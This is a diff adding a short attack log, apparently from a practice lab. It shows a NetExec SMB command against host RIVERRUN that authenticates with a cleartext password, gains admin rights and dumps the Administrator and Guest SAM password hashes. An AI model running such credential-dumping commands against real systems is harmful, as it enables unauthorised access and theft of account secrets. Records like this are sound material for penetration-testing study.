@@ -1,0 +1,8 @@
+[2026-10-17 09:12:01]> nxc smb 192.168.56.24 -u jojen.reed -p Gr33nS1ght! --sam --log nxc/smb-riverrun.log
+
+2026-10-17 09:12:02 | smb.py:333 - INFO - SMB         192.168.56.24   445    RIVERRUN         [*] Windows Server 2019 Standard 17763 x64 (name:RIVERRUN) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+2026-10-17 09:12:03 | smb.py:539 - INFO - SMB         192.168.56.24   445    RIVERRUN         [+] north.sevenkingdoms.local\jojen.reed:Gr33nS1ght! (Pwn3d!)
+2026-10-17 09:12:04 | smb.py:2315 - INFO - SMB         192.168.56.24   445    RIVERRUN         [*] Dumping SAM hashes
+2026-10-17 09:12:05 | smb.py:2281 - INFO - SMB         192.168.56.24   445    RIVERRUN         Administrator:500:aad3b435b51404eeaad3b435b51404ee:a141817c48ef7530b8976f9e0b2afea2:::
+2026-10-17 09:12:05 | smb.py:2281 - INFO - SMB         192.168.56.24   445    RIVERRUN         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+2026-10-17 09:12:06 | smb.py:2319 - INFO - SMB         192.168.56.24   445    RIVERRUN         [+] Added 2 SAM hashes to the database
